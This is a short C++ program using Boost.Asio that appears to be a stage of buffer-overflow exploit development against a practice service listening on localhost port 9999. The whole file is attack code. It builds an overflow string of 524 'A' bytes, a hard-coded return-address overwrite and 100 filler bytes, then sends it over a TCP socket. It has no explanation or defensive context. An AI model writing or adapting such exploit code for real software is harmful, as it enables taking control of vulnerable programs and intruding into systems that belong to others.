#include <iostream>
#include <boost/asio.hpp>
#include "./../helper.cpp"

using namespace boost;
using namespace std;
using namespace NAM;

#define errormayhappen                                     \
    if (ec.value())                                        \
    {                                                      \
        cerr << (string) "Error : " + ec.message() + "\n"; \
        return ec.value();                                 \
    }


int main(int argc, char *argv[])
{
    string payload = createstr('A', 524);

    payload = payload + "\xf3\x12\x17\x31" + createstr('C',100);
    asio::io_service ioservice;
    system::error_code ec;
    asio::ip::address ip = asio::ip::address::from_string("127.0.0.1", ec);
    int port = 9999;
    asio::ip::tcp::endpoint ep(ip, port);
    errormayhappen;
    asio::ip::tcp::socket client(ioservice);
    client.open(asio::ip::tcp::v4(), ec);
    errormayhappen;
    client.connect(ep, ec);
    errormayhappen;

    client.write_some(asio::buffer(payload.data(), payload.size()), ec);
    errormayhappen;

    client.close(ec);
    errormayhappen;

    return 0;
}